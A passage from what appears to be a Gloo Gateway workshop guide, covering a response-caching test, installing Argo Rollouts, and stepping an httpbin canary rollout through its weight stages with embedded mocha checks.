const cachepath = '/cache/1';
var path_key;

describe("response caching", function() {
  this.timeout(3000); // The test needs more than default (2secs)

  // Make the first request whose response will be cached
  beforeEach(function(done) {
    path_key = crypto.randomUUID();
    chai.request(httpbin).get(cachepath).query({key: path_key}).end((err, response) => {
      if (err) return done(err);
      done();
    });
  });

  it('returns a cached response within cache TTL', function(done) {
    setTimeout(() => {
      chai.request(httpbin).get(cachepath).query({key: path_key}).end((err, response) => {
        if (err) return done(err);
        try {
          expect(response).to.have.status(200);
          expect(response).to.have.header('age');
          done();
        } catch (e) {
          done(e);
        }
      });
    }, 100);
  });

  it('returns a fresh response beyond cache TTL', function(done) {
    setTimeout(() => {
      chai.request(httpbin).get(cachepath).query({key: path_key}).end((err, response) => {
        if (err) return done(err);
        try {
          expect(response).to.have.status(200);
          expect(response).to.not.have.header('age');
          done();
        } catch (e) {
          done(e);
        }
      });
    }, 2000);
  });

})

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/caching/tests/caching-applies.test.js.liquid from lab number 23"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=200 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 23"; exit 1; }
-->

Notice that the first two responses have the same `date` header showing that the response for the first request was also returned as the response for the second request.
The second response also has a new `age` header, corresponding to how long the response has been cached for.

The third response has a different `date` timestamp and no `age` header:
this request was made 12 seconds after the first, but the cache entry had expired 10 seconds after the original request, so the third request did not receive a cached response.

Let's delete the `HttpListenerOption` we created:

```bash
kubectl --context ${CLUSTER1} -n gloo-system delete httplisteneroption cache
```



## Lab 24 - Deploy Argo Rollouts <a name="lab-24---deploy-argo-rollouts-"></a>

[Argo Rollouts](https://argoproj.github.io/rollouts/) is a declarative progressive delivery tool for Kubernetes that we can use to update applications gradually, using a blue/green or canary strategy to manage the rollout.

Run the following commands to install Argo Rollouts in your environment:

```bash
helm upgrade --install argo-rollouts argo-rollouts \
  --repo https://argoproj.github.io/argo-helm \
  --version 2.38.2 \
  --kube-context ${CLUSTER1} \
  --namespace argo-rollouts \
  --create-namespace \
  --wait \
  -f -<<EOF
controller:
  trafficRouterPlugins:
  - name: "argoproj-labs/gatewayAPI"
    location: "https://github.com/argoproj-labs/rollouts-plugin-trafficrouter-gatewayapi/releases/download/v0.5.0/gatewayapi-plugin-linux-$(uname -m | sed 's/aarch/arm/' | sed 's/x86_/amd/')"
EOF
```

Download and install the Argo Rollouts plugin for `kubectl`:

```bash
mkdir -p ${HOME}/bin
curl -Lo ${HOME}/bin/kubectl-argo-rollouts "https://github.com/argoproj/argo-rollouts/releases/latest/download/kubectl-argo-rollouts-$(uname | tr '[:upper:]' '[:lower:]')-$(uname -m | sed 's/aarch/arm/' | sed 's/x86_/amd/')"
chmod +x ${HOME}/bin/kubectl-argo-rollouts
export PATH=$HOME/bin:$PATH
```

Now we're ready to use Argo Rollouts to progressively update applications as part of continuous delivery.



## Lab 25 - Roll out a new app version using Argo Rollouts <a name="lab-25---roll-out-a-new-app-version-using-argo-rollouts-"></a>

We're going to use Argo Rollouts to gradually deliver an upgraded version of our httpbin application.
To do this, we'll define a resource that lets Argo Rollouts know how we want it to handle updates to our application,
upgrade the application itself, and then step through the stages of the rollout and see how it interacts with our gateway resources.

First, convert the current `httpbin1` deployment to an Argo Rollouts [`Rollout`](https://argo-rollouts.readthedocs.io/en/stable/features/specification/)
and downgrade the version of the application, so that we can upgrade it as a managed rollout:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: argoproj.io/v1alpha1
kind: Rollout
metadata:
  name: httpbin1
  namespace: httpbin
spec:
  replicas: 1
  selector:
    matchLabels:
      app: httpbin1
      version: v1
  strategy:
    canary:
      steps:
      - pause: {}
      - setWeight: 50
      - pause: {}
      - setWeight: 100
      - pause: {}
  template:
    metadata:
      labels:
        app: httpbin1
        version: v1
    spec:
      serviceAccountName: httpbin1
      containers:
      - name: httpbin
        image: mccutchen/go-httpbin:v2.13.4
        command: [ go-httpbin ]
        args:
          - "-max-duration"
          - "600s" # override default 10s
          - -use-real-hostname
        ports:
          - name: http
            containerPort: 8080
            protocol: TCP
        livenessProbe:
          httpGet:
            path: /status/200
            port: http
        readinessProbe:
          httpGet:
            path: /status/200
            port: http
        resources:
          limits:
            cpu: 1
            memory: 512Mi
          requests:
            cpu: 100m
            memory: 256Mi
        env:
        - name: K8S_MEM_LIMIT
          valueFrom:
            resourceFieldRef:
              divisor: "1"
              resource: limits.memory
        - name: GOMAXPROCS
          valueFrom:
            resourceFieldRef:
              divisor: "1"
              resource: limits.cpu
EOF

kubectl --context ${CLUSTER1} -n httpbin delete deployment httpbin1
```

<!--bash
echo -n Waiting for rollout to be ready...
timeout -v 5m bash -c "until [[ \$(kubectl argo rollouts --context ${CLUSTER1} -n httpbin status httpbin1 -t 1s 2>/dev/null) ]]; do
  sleep 1
  echo -n .
done"
echo
-->

> *We elected to convert our deployment to a `Rollout`, but we could also have created a new `Rollout` with a reference to the existing deployment,
as documented [here](https://argo-rollouts.readthedocs.io/en/stable/migrating/#reference-deployment-from-rollout).*

Note that a `Rollout` is very similar to a `Deployment`, but with additional information to express how an update to the application should be delivered.
In our case, we've specified the "canary" strategy and given it five steps:

```,nocopy
  strategy:
    canary:
      steps:
      - pause: {}
      - setWeight: 50
      - pause: {}
      - setWeight: 100
      - pause: {}
```

These steps define the canary strategy:

* When detecting a new application version, first **do nothing** until instructed to proceed
* Set weights to **split traffic equally** between the existing stable application and the new canary version, then await an instruction to continue
* Set weights to send **all traffic** to the new canary version, then await an instruction to continue
* Complete the rollout by replacing the previous stable version with the new canary version, and removing the previous stable version

You can now see the status of the rollout in the Argo Rollouts CLI and dashboard.
List all rollouts in the cluster with the CLI:

```bash,noexecute
kubectl argo rollouts --context ${CLUSTER1} list rollouts -A
```

Get the specific details of our rollout with this command:

```bash
kubectl argo rollouts --context ${CLUSTER1} -n httpbin get rollout httpbin1
```

You should see a rich output that shows the rollout with a single revision in its completed state:

```,nocopy
Name:            httpbin1
Namespace:       httpbin
Status:          ✔ Healthy
Strategy:        Canary
  Step:          5/5
  SetWeight:     100
  ActualWeight:  100
Images:          mccutchen/go-httpbin:v2.13.4 (stable)
Replicas:
  Desired:       1
  Current:       1
  Updated:       1
  Ready:         1
  Available:     1

NAME                                 KIND        STATUS     AGE  INFO
⟳ httpbin1                           Rollout     ✔ Healthy  12s
└──# revision:1
   └──⧉ httpbin1-9fcf7cc96           ReplicaSet  ✔ Healthy  12s  stable
      └──□ httpbin1-9fcf7cc96-7pr4f  Pod         ✔ Running  12s  ready:1/1
```

The same information is available in the Argo Rollouts dashboard.
You can access the dashboard by running this command:

```bash,noexecute
kubectl argo rollouts --context ${CLUSTER1} dashboard
```

and visiting  <http://localhost:3100/rollouts> in your browser. Press `Ctrl+C` in the terminal to get your prompt back when you're finished.

We haven't yet provided information on how to set the weights to actually impact traffic to the application versions.
Let's do that by creating a new canary service, identical to the existing service in all but name, and adding it as a backend in the `HTTPRoute`:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: v1
kind: Service
metadata:
  name: httpbin1-canary
  namespace: httpbin
  labels:
    app: httpbin1
    service: httpbin1
spec:
  ports:
  - name: http
    port: 8000
    targetPort: http
    protocol: TCP
    appProtocol: http
  selector:
    app: httpbin1
EOF

kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      backendRefs:
        - name: httpbin1
          port: 8000
        - name: httpbin1-canary
          port: 8000
EOF
```

Then we can configure the rollout to let it know which service is for our stable application, which is for the canary version, and which Gateway API `HTTPRoute` should be manipulated:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: argoproj.io/v1alpha1
kind: Rollout
metadata:
  name: httpbin1
  namespace: httpbin
spec:
  replicas: 1
  selector:
    matchLabels:
      app: httpbin1
      version: v1
  strategy:
    canary:
      steps:
      - pause: {}
      - setWeight: 50
      - pause: {}
      - setWeight: 100
      - pause: {}
      stableService: httpbin1
      canaryService: httpbin1-canary
      trafficRouting:
        plugins:
          argoproj-labs/gatewayAPI:
            httpRoute: httpbin
            namespace: httpbin
  template:
    metadata:
      labels:
        app: httpbin1
        version: v1
    spec:
      serviceAccountName: httpbin1
      containers:
      - name: httpbin
        image: mccutchen/go-httpbin:v2.13.4
        command: [ go-httpbin ]
        args:
          - "-max-duration"
          - "600s" # override default 10s
          - -use-real-hostname
        ports:
          - name: http
            containerPort: 8080
            protocol: TCP
        livenessProbe:
          httpGet:
            path: /status/200
            port: http
        readinessProbe:
          httpGet:
            path: /status/200
            port: http
        resources:
          limits:
            cpu: 1
            memory: 512Mi
          requests:
            cpu: 100m
            memory: 256Mi
        env:
        - name: K8S_MEM_LIMIT
          valueFrom:
            resourceFieldRef:
              divisor: "1"
              resource: limits.memory
        - name: GOMAXPROCS
          valueFrom:
            resourceFieldRef:
              divisor: "1"
              resource: limits.cpu
EOF
```

Take a look at the "stable" service now that the `Rollout` has been updated:

```bash,noexecute
kubectl --context ${CLUSTER1} -n httpbin get svc httpbin1 -oyaml
```

Note that there's a new item in the `selector` field:

```,nocopy
  selector:
    app: httpbin1
    rollouts-pod-template-hash: 9fcf7cc96
```

This means that the stable service has been modified to point to the `ReplicaSet` that manages the "stable" pods.

Check the canary service too:

```bash,noexecute
kubectl --context ${CLUSTER1} -n httpbin get svc httpbin1-canary -oyaml
```

It has the same addition, referring to the same `ReplicaSet` label.
At the moment, both services are referring to the same `ReplicaSet` because we are not currently performing a rollout.
<!--bash
cat <<'EOF' > ./test.js
const chaiExec = require("@jsdevtools/chai-exec");
var chai = require('chai');
var expect = chai.expect;
chai.use(chaiExec);

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 1000);
  } else {
    done();
  }
});

describe("httpbin rollout", () => {
  it("is at step 5 with canary weight 100 and stable image tag v2.13.4", () => {
    let cli = chaiExec(`kubectl argo rollouts --context ${process.env.CLUSTER1} -n httpbin get rollout httpbin1 --no-color`);
    expect(cli).to.exit.with.code(0);
    expect(cli).to.have.output.that.matches(new RegExp("\\bStatus:\\s+.+ Healthy\\b"));
    expect(cli).to.have.output.that.matches(new RegExp("\\bStep:\\s+5/5\\b"));
    expect(cli).to.have.output.that.matches(new RegExp("\\bActualWeight:\\s+100\\b"));
    expect(cli).to.have.output.that.matches(new RegExp("mccutchen/go-httpbin:v2.13.4.+(stable)\\b"));
  });
});

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/rollout.test.js.liquid from lab number 25"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 25"; exit 1; }
-->
<!--bash
cat <<'EOF' > ./test.js
const chaiExec = require("@jsdevtools/chai-exec");
var chai = require('chai');
var expect = chai.expect;
chai.use(chaiExec);

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 1000);
  } else {
    done();
  }
});

const canaryWeight = 0
const stableWeight = 100 - canaryWeight

describe("httproute weights for rollout canary weight 0", () => {
  it("has canary route weight", () => {
    let cli = chaiExec(`kubectl --context ${process.env.CLUSTER1} -n httpbin get httproute httpbin -o jsonpath='{.spec.rules[0].backendRefs[?(@.name == "httpbin1-canary")].weight}'`);
    expect(cli).to.exit.with.code(0);
    expect(cli).output.to.equal(`'${canaryWeight}'`);
  });

  it("has stable route weight", () => {
    let cli = chaiExec(`kubectl --context ${process.env.CLUSTER1} -n httpbin get httproute httpbin -o jsonpath='{.spec.rules[0].backendRefs[?(@.name == "httpbin1")].weight}'`);
    expect(cli).to.exit.with.code(0);
    expect(cli).output.to.equal(`'${stableWeight}'`);
  });
});

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/route-weights.test.js.liquid from lab number 25"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 25"; exit 1; }
-->

Now, let's trigger the rollout by updating the image of the `httpbin` container to the latest version:

```bash
kubectl argo rollouts --context ${CLUSTER1} -n httpbin set image httpbin1 httpbin=mccutchen/go-httpbin:v2.14.0
```

<!--bash
echo -n Waiting for rollout to be ready...
timeout -v 5m bash -c "until [[ \$(kubectl --context ${CLUSTER1} -n httpbin get rollout httpbin1 -ojsonpath='{.status.currentStepIndex}' 2>/dev/null) -eq 0 ]]; do
  sleep 1
  echo -n .
done"
echo
-->

According to the canary strategy we defined, at the moment there will be no change to our application.
However, our rollout will have started, and we can see that with the following command:

```bash
kubectl argo rollouts --context ${CLUSTER1} -n httpbin get rollout httpbin1
```

This shows us that the rollout is paused and that Argo Rollouts has created a canary `ReplicaSet` with 0 replicas for now:

```,nocopy
Name:            httpbin1
Namespace:       httpbin
Status:          ॥ Paused
Message:         CanaryPauseStep
Strategy:        Canary
  Step:          0/5
  SetWeight:     0
  ActualWeight:  0
Images:          mccutchen/go-httpbin:v2.13.4 (stable)
Replicas:
  Desired:       1
  Current:       1
  Updated:       0
  Ready:         1
  Available:     1

NAME                                 KIND        STATUS        AGE  INFO
⟳ httpbin1                           Rollout     ॥ Paused      77s
├──# revision:2
│  └──⧉ httpbin1-78b4897d85          ReplicaSet  • ScaledDown  4s   canary
└──# revision:1
   └──⧉ httpbin1-9fcf7cc96           ReplicaSet  ✔ Healthy     77s  stable
      └──□ httpbin1-9fcf7cc96-7pr4f  Pod         ✔ Running     77s  ready:1/1
```
<!--bash
cat <<'EOF' > ./test.js
const chaiExec = require("@jsdevtools/chai-exec");
var chai = require('chai');
var expect = chai.expect;
chai.use(chaiExec);

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 1000);
  } else {
    done();
  }
});

describe("httpbin rollout", () => {
  it("is at step 0 with canary weight 0 and stable image tag v2.13.4", () => {
    let cli = chaiExec(`kubectl argo rollouts --context ${process.env.CLUSTER1} -n httpbin get rollout httpbin1 --no-color`);
    expect(cli).to.exit.with.code(0);
    expect(cli).to.have.output.that.matches(new RegExp("\\bStatus:\\s+.+ Paused\\b"));
    expect(cli).to.have.output.that.matches(new RegExp("\\bStep:\\s+0/5\\b"));
    expect(cli).to.have.output.that.matches(new RegExp("\\bActualWeight:\\s+0\\b"));
    expect(cli).to.have.output.that.matches(new RegExp("mccutchen/go-httpbin:v2.13.4.+(stable)\\b"));
  });
});

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/rollout.test.js.liquid from lab number 25"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 25"; exit 1; }
-->
<!--bash
cat <<'EOF' > ./test.js
const chaiExec = require("@jsdevtools/chai-exec");
var chai = require('chai');
var expect = chai.expect;
chai.use(chaiExec);

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 1000);
  } else {
    done();
  }
});

const canaryWeight = 0
const stableWeight = 100 - canaryWeight

describe("httproute weights for rollout canary weight 0", () => {
  it("has canary route weight", () => {
    let cli = chaiExec(`kubectl --context ${process.env.CLUSTER1} -n httpbin get httproute httpbin -o jsonpath='{.spec.rules[0].backendRefs[?(@.name == "httpbin1-canary")].weight}'`);
    expect(cli).to.exit.with.code(0);
    expect(cli).output.to.equal(`'${canaryWeight}'`);
  });

  it("has stable route weight", () => {
    let cli = chaiExec(`kubectl --context ${process.env.CLUSTER1} -n httpbin get httproute httpbin -o jsonpath='{.spec.rules[0].backendRefs[?(@.name == "httpbin1")].weight}'`);
    expect(cli).to.exit.with.code(0);
    expect(cli).output.to.equal(`'${stableWeight}'`);
  });
});

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/route-weights.test.js.liquid from lab number 25"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 25"; exit 1; }
-->

Let's get it to the next step by running this command:

```bash
kubectl argo rollouts --context ${CLUSTER1} -n httpbin promote httpbin1
```

You can also do this in the dashboard if you prefer.

<!--bash
echo -n Waiting for rollout to be ready...
timeout -v 5m bash -c "until [[ \$(kubectl --context ${CLUSTER1} -n httpbin get rollout httpbin1 -ojsonpath='{.status.currentStepIndex}' 2>/dev/null) -eq 2 ]]; do
  sleep 1
  echo -n .
done"
echo
-->

Check the rollout status again:

```bash
kubectl argo rollouts --context ${CLUSTER1} -n httpbin get rollout httpbin1
```

Note that the canary `ReplicaSet` now has a pod, and the weights are now set to 50%:

```,nocopy
Name:            httpbin1
Namespace:       httpbin
Status:          ॥ Paused
Message:         CanaryPauseStep
Strategy:        Canary
  Step:          2/5
  SetWeight:     50
  ActualWeight:  50
Images:          mccutchen/go-httpbin:v2.13.4 (stable)
                 mccutchen/go-httpbin:v2.14.0 (canary)
Replicas:
  Desired:       1
  Current:       2
  Updated:       1
  Ready:         2
  Available:     2

NAME                                  KIND        STATUS     AGE    INFO
⟳ httpbin1                            Rollout     ॥ Paused   2m41s
├──# revision:2
│  └──⧉ httpbin1-78b4897d85           ReplicaSet  ✔ Healthy  88s    canary
│     └──□ httpbin1-78b4897d85-jsrzl  Pod         ✔ Running  3s     ready:1/1
└──# revision:1
   └──⧉ httpbin1-9fcf7cc96            ReplicaSet  ✔ Healthy  2m41s  stable
      └──□ httpbin1-9fcf7cc96-7pr4f   Pod         ✔ Running  2m41s  ready:1/1
```

According to our strategy, 50% of our traffic should now be being routed to the canary, and 50% to the stable version.
Let's check the `HTTPRoute` to see this in effect:

```bash
kubectl --context ${CLUSTER1} -n httpbin describe httproute httpbin
```

Note that Argo Rollouts has automatically modified the `weight`s on each of the routes:

```,nocopy
Spec:
  ...
  Rules:
    Backend Refs:
      Group:
      Kind:    Service
      Name:    httpbin1
      Port:    8000
      Weight:  50
      Group:
      Kind:    Service
      Name:    httpbin1-canary
      Port:    8000
      Weight:  50
```

Take a look at the canary service again:

```bash,noexecute
kubectl --context ${CLUSTER1} -n httpbin get svc httpbin1-canary -oyaml
```

Note that the selector has been updated with the canary `ReplicaSet`'s hash:

```,nocopy
  selector:
    app: httpbin1
    rollouts-pod-template-hash: 78b4897d85
```

Argo Rollouts has updated the canary service to point to the new canary pods and modified the `HTTPRoute` to set the desired weights for traffic distribution across the stable and canary services.
<!--bash
cat <<'EOF' > ./test.js
const chaiExec = require("@jsdevtools/chai-exec");
var chai = require('chai');
var expect = chai.expect;
chai.use(chaiExec);

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 1000);
  } else {
    done();
  }
});

describe("httpbin rollout", () => {
  it("is at step 2 with canary weight 50 and stable image tag v2.13.4", () => {
    let cli = chaiExec(`kubectl argo rollouts --context ${process.env.CLUSTER1} -n httpbin get rollout httpbin1 --no-color`);
    expect(cli).to.exit.with.code(0);
    expect(cli).to.have.output.that.matches(new RegExp("\\bStatus:\\s+.+ Paused\\b"));
    expect(cli).to.have.output.that.matches(new RegExp("\\bStep:\\s+2/5\\b"));
    expect(cli).to.have.output.that.matches(new RegExp("\\bActualWeight:\\s+50\\b"));
    expect(cli).to.have.output.that.matches(new RegExp("mccutchen/go-httpbin:v2.13.4.+(stable)\\b"));
  });
});

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/rollout.test.js.liquid from lab number 25"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 25"; exit 1; }
-->
<!--bash
cat <<'EOF' > ./test.js
const chaiExec = require("@jsdevtools/chai-exec");
var chai = require('chai');
var expect = chai.expect;
chai.use(chaiExec);

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 1000);
  } else {
    done();
  }
});

const canaryWeight = 50
const stableWeight = 100 - canaryWeight

describe("httproute weights for rollout canary weight 50", () => {
  it("has canary route weight", () => {
    let cli = chaiExec(`kubectl --context ${process.env.CLUSTER1} -n httpbin get httproute httpbin -o jsonpath='{.spec.rules[0].backendRefs[?(@.name == "httpbin1-canary")].weight}'`);
    expect(cli).to.exit.with.code(0);
    expect(cli).output.to.equal(`'${canaryWeight}'`);
  });

  it("has stable route weight", () => {
    let cli = chaiExec(`kubectl --context ${process.env.CLUSTER1} -n httpbin get httproute httpbin -o jsonpath='{.spec.rules[0].backendRefs[?(@.name == "httpbin1")].weight}'`);
    expect(cli).to.exit.with.code(0);
    expect(cli).output.to.equal(`'${stableWeight}'`);
  });
});

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/route-weights.test.js.liquid from lab number 25"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 25"; exit 1; }
-->

Let's proceed to the last step of the rollout by promoting the rollout in the dashboard or running this command:

```bash
kubectl argo rollouts --context ${CLUSTER1} -n httpbin promote httpbin1
```

<!--bash
echo -n Waiting for rollout to be ready...
timeout -v 5m bash -c "until [[ \$(kubectl -n httpbin get rollout httpbin1 -ojsonpath='{.status.currentStepIndex}' 2>/dev/null) -eq 4 ]]; do
  sleep 1
  echo -n .
done"
echo
-->

100% of our traffic should now be being routed to the canary, and none to the stable version.
Let's check the `HTTPRoute` again to see this in effect:

```bash
kubectl -n httpbin describe httproute httpbin
```

```,nocopy
Spec:
  ...
  Rules:
    Backend Refs:
      Group:
      Kind:    Service
      Name:    httpbin1
      Port:    8000
      Weight:  0
      Group:
      Kind:    Service
      Name:    httpbin1-canary
      Port:    8000
      Weight:  100
```
<!--bash
cat <<'EOF' > ./test.js
const chaiExec = require("@jsdevtools/chai-exec");
var chai = require('chai');
var expect = chai.expect;
chai.use(chaiExec);

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 1000);
  } else {
    done();
  }
});

describe("httpbin rollout", () => {
  it("is at step 4 with canary weight 100 and stable image tag v2.13.4", () => {
    let cli = chaiExec(`kubectl argo rollouts --context ${process.env.CLUSTER1} -n httpbin get rollout httpbin1 --no-color`);
    expect(cli).to.exit.with.code(0);
    expect(cli).to.have.output.that.matches(new RegExp("\\bStatus:\\s+.+ Paused\\b"));
    expect(cli).to.have.output.that.matches(new RegExp("\\bStep:\\s+4/5\\b"));
    expect(cli).to.have.output.that.matches(new RegExp("\\bActualWeight:\\s+100\\b"));
    expect(cli).to.have.output.that.matches(new RegExp("mccutchen/go-httpbin:v2.13.4.+(stable)\\b"));
  });
});

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/rollout.test.js.liquid from lab number 25"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 25"; exit 1; }
-->
<!--bash
cat <<'EOF' > ./test.js
const chaiExec = require("@jsdevtools/chai-exec");
var chai = require('chai');
var expect = chai.expect;
chai.use(chaiExec);

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 1000);
  } else {
    done();
  }
});

const canaryWeight = 100
const stableWeight = 100 - canaryWeight

describe("httproute weights for rollout canary weight 100", () => {
  it("has canary route weight", () => {
    let cli = chaiExec(`kubectl --context ${process.env.CLUSTER1} -n httpbin get httproute httpbin -o jsonpath='{.spec.rules[0].backendRefs[?(@.name == "httpbin1-canary")].weight}'`);
    expect(cli).to.exit.with.code(0);
    expect(cli).output.to.equal(`'${canaryWeight}'`);
  });

  it("has stable route weight", () => {
    let cli = chaiExec(`kubectl --context ${process.env.CLUSTER1} -n httpbin get httproute httpbin -o jsonpath='{.spec.rules[0].backendRefs[?(@.name == "httpbin1")].weight}'`);
    expect(cli).to.exit.with.code(0);
    expect(cli).output.to.equal(`'${stableWeight}'`);
  });
});

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/route-weights.test.js.liquid from lab number 25"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 25"; exit 1; }
-->

One final promotion of the rollout will get us back to the completed state, where we have a single pod running the new image; all traffic is being routed to it through the stable service; and both the stable and canary services will be selecting the new pod.
Let's get to that state now:

```bash
kubectl argo rollouts --context ${CLUSTER1} -n httpbin promote httpbin1
```

<!--bash
echo -n Waiting for rollout to be ready...
timeout -v 5m bash -c "until [[ \$(kubectl -n httpbin get rollout httpbin1 -ojsonpath='{.status.currentStepIndex}' 2>/dev/null) -eq 5 ]]; do
  sleep 1
  echo -n .
  kubectl argo rollouts --context ${CLUSTER1} -n httpbin promote httpbin1
done"
echo
-->

Check the rollout status one last time:

```bash
kubectl argo rollouts --context ${CLUSTER1} -n httpbin get rollout httpbin1
```

You'll get output like this:

```,nocopy
Name:            httpbin1
Namespace:       httpbin
Status:          ✔ Healthy
Strategy:        Canary
  Step:          5/5
  SetWeight:     100
  ActualWeight:  100
Images:          mccutchen/go-httpbin:v2.13.4
                 mccutchen/go-httpbin:v2.14.0 (stable)
Replicas:
  Desired:       1
  Current:       2
  Updated:       1
  Ready:         2
  Available:     2

NAME                                  KIND        STATUS     AGE    INFO
⟳ httpbin1                            Rollout     ✔ Healthy  6m15s
├──# revision:2
│  └──⧉ httpbin1-78b4897d85           ReplicaSet  ✔ Healthy  5m2s   stable
│     └──□ httpbin1-78b4897d85-jsrzl  Pod         ✔ Running  3m37s  ready:1/1
└──# revision:1
   └──⧉ httpbin1-9fcf7cc96            ReplicaSet  ✔ Healthy  6m15s  delay:25s
      └──□ httpbin1-9fcf7cc96-7pr4f   Pod         ✔ Running  6m15s  ready:1/1
```

After a short delay, `revision:1` will be scaled down and the rollout of the new version of our application will be completed.

In a more realistic environment, we would have used these pauses to perform [analysis](https://argo-rollouts.readthedocs.io/en/stable/features/analysis/)
on the canary versions to make sure the new version is working and performant, with the option to automatically promote or abort rollouts based on metrics.
<!--bash
cat <<'EOF' > ./test.js
const chaiExec = require("@jsdevtools/chai-exec");
var chai = require('chai');
var expect = chai.expect;
chai.use(chaiExec);

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 1000);
  } else {
    done();
  }
});

describe("httpbin rollout", () => {
  it("is at step 5 with canary weight 100 and stable image tag v2.14.0", () => {
    let cli = chaiExec(`kubectl argo rollouts --context ${process.env.CLUSTER1} -n httpbin get rollout httpbin1 --no-color`);
    expect(cli).to.exit.with.code(0);
    expect(cli).to.have.output.that.matches(new RegExp("\\bStatus:\\s+.+ Healthy\\b"));
    expect(cli).to.have.output.that.matches(new RegExp("\\bStep:\\s+5/5\\b"));
    expect(cli).to.have.output.that.matches(new RegExp("\\bActualWeight:\\s+100\\b"));
    expect(cli).to.have.output.that.matches(new RegExp("mccutchen/go-httpbin:v2.14.0.+(stable)\\b"));
  });
});

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/rollout-final.test.js.liquid from lab number 25"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 25"; exit 1; }
-->
<!--bash
cat <<'EOF' > ./test.js
const chaiExec = require("@jsdevtools/chai-exec");
var chai = require('chai');
var expect = chai.expect;
chai.use(chaiExec);

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 1000);
  } else {
    done();
  }
});

const canaryWeight = 0
const stableWeight = 100 - canaryWeight

describe("httproute weights for rollout canary weight 0", () => {
  it("has canary route weight", () => {
    let cli = chaiExec(`kubectl --context ${process.env.CLUSTER1} -n httpbin get httproute httpbin -o jsonpath='{.spec.rules[0].backendRefs[?(@.name == "httpbin1-canary")].weight}'`);
    expect(cli).to.exit.with.code(0);
    expect(cli).output.to.equal(`'${canaryWeight}'`);
  });

  it("has stable route weight", () => {
    let cli = chaiExec(`kubectl --context ${process.env.CLUSTER1} -n httpbin get httproute httpbin -o jsonpath='{.spec.rules[0].backendRefs[?(@.name == "httpbin1")].weight}'`);
    expect(cli).to.exit.with.code(0);
    expect(cli).output.to.equal(`'${stableWeight}'`);
  });
});

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/route-weights.test.js.liquid from lab number 25"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 25"; exit 1; }
-->
You can clean up by deleting the `Rollout` and canary service:

```bash
kubectl --context ${CLUSTER1} -n httpbin delete rollout httpbin1
kubectl --context ${CLUSTER1} -n httpbin delete svc httpbin1-canary
```

then apply the original `httpbin1` deployment and the `HTTPRoute` manifest:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: apps/v1
kind: Deployment
metadata:
  name: httpbin1
